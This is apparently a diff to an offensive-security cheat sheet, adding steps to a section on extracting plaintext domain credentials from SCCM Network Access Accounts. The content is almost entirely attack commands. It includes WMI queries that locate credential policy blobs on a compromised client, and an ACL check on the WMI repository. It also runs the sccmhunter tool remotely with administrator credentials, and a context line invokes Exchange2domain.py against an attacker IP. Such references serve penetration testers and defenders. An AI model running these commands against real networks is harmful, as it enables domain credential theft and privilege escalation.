@@ -4048,6 +4048,7 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
 
 > If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.
 
+On the machine.
 * Find SCCM blob
     ```ps1
     Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
@@ -4063,6 +4064,12 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
     ```ps1
     Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
     ConvertFrom-SddlString ""
+    ```
+
+From a remote machine.
+* Using [garrettfoster13/sccmhunter](https://github.com/garrettfoster13/sccmhunter)
+    ```ps1
+    python3 ./sccmhunter.py http -u "administrator" -p "P@ssw0rd" -d internal.lab -dc-ip 10.10.10.10. -auto
     ```
 
 
